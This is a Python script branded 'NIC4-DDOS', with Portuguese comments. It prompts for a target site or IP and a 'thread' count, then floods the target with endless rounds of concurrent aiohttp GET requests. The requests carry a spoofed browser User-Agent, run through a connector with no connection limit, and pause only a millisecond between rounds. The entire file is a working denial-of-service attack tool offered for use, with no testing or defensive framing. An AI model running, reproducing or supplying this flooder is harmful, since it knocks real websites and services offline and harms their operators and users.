# -*- coding: utf-8 -*-

from pyfiglet import figlet_format
import asyncio
import aiohttp
import sys

from pyfiglet import figlet_format

# Exibe o título estilizado
print(figlet_format("NIC4-DDOS"))

# Exibe a sua arte ASCII
print("""
⠀⠀⠀⠀⠀⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇⠀⠀⠀
⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄⠀
⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋⠀⠀
⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇⠀⠀⠀
⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

# Captura de input protegida por Ctrl+C global
try:
    while True:
        # 1. Corrigido para 'input' minúsculo e adicionado .strip() para limpar espaços
        url = input("site ou ip fudidoXD: ").strip()
        
        # Se o usuário não digitar nada, pede de novo
        if not url:
            continue
            
        # 2. Se for IP ou domínio puro, transforma em HTTP automaticamente
        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"
            
        # Opcional: Se quiser bloquear entradas totalmente inválidas (ex: só letras sem sentido)
        # você pode colocar uma validação aqui. Caso contrário, ele aceita e sai do loop.
        break

    print("\nURL Final:", url)

except KeyboardInterrupt:
    # Captura o Ctrl+C para o programa fechar elegantemente sem dar erro na tela
    print("\n\n[!] Script interrompido pelo usuário. Saindo...")

#~~~~~~~~~~~
#conexoes
#~~~~~~~~~~~
# CORREÇÃO 1: Transformando o input em número inteiro (int)
CONEXOES = int(input("quantidade de threads: "))

async def enviar_requisicao(session, url_alvo):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        async with session.get(url_alvo, headers=headers, timeout=aiohttp.ClientTimeout(total=1.5)) as response:
            await response.content.read(1024)
    except asyncio.CancelledError:
        raise 
    except Exception:
        pass 

async def iniciar():
    print(f"\n[*] Iniciando com {CONEXOES} threads...")
    print("[*] Pressione Ctrl + C para parar a qualquer momento.\n")

    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300, use_dns_cache=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            # CORREÇÃO 2: Alterado de 'url' para 'url_alvo' para bater com o argumento lá de cima
            tarefas = [enviar_requisicao(session, url) for _ in range(CONEXOES)]

            await asyncio.gather(*tarefas)
            await asyncio.sleep(0.001)

try:
    asyncio.run(iniciar())
except KeyboardInterrupt:
    print("\n[*] DDoS finalizado pelo usuário.")
    sys.exit(0)

